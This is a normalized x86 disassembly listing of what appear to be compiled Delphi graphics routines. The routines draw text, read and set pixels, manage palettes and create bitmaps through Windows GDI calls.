push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425644
mov eax ebx
call sub_4252b0
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_4042f8
push eax
mov eax esi
call sub_4044f8
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_4253ac
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_42517c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_4253ac
inc eax
add edi eax
sub_425368
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425644
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_4042f8
push eax
mov eax edi
call sub_4044f8
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_4253ac
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_425368
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4253c8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_425368
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4253e8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_425434
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42543b
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_425154
sub_425494
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425644
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_4254b8
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_42517c
pop ecx
pop edx
pop edi
pop esi
retn
sub_4254d8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425644
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_425504
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425644
mov eax [ ebp + 0x8 ]
call sub_423fe4
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_42554c
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425644
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetClipBox
pop esi
pop ebx
retn
sub_425590
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_4255f0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_425590
mov edx esp
mov eax ebx
call sub_425494
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_4254b8
sub_425644
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_4256e0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
test bl 0x8
je r-xdata
mov eax esi
call sub_42570c
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_42573c
sub_4256e0
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_4244b8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423fe4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_42570c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4249b8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_42573c
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_424ca4
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_424ca4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_424d84
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_424c68
call sub_423fe4
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_424c68
call sub_423fe4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_42586c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4258b6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4258bd
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_4258c0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_42595c
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_42586c
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_4042a8
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425963
lea eax [ ebp - 0x104 ]
call sub_404038
retn
sub_425978
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_425ac6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_425a35
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_4258c0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_4258c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425acd
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_425ad8
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_425b0c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_425968
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_425d8c
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_425968
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425d93
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_425968
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_425bdf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406cf0
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425d93
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_425da0
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_425dd8
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402cbc
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_425e50
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_425ea8
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028c8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425fa5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425fac
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_425fc0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_426046
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_426058
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028c8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_425e50
mov eax esp
call sub_425fc0
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_4260fc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_425e50
mov [ esp ] eax
sub_426150
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_425af8
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_425ad8
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4262fc
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_425968
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_426222
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_425978
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426229
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_42586c
sub_426229
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_425af8
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_425968
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4262dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_425978
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4262e3
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_426318
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_4263a8
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407ea8
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_42669f
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_426491
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_42586c
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426498
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_426498
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_42630c
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407ea8
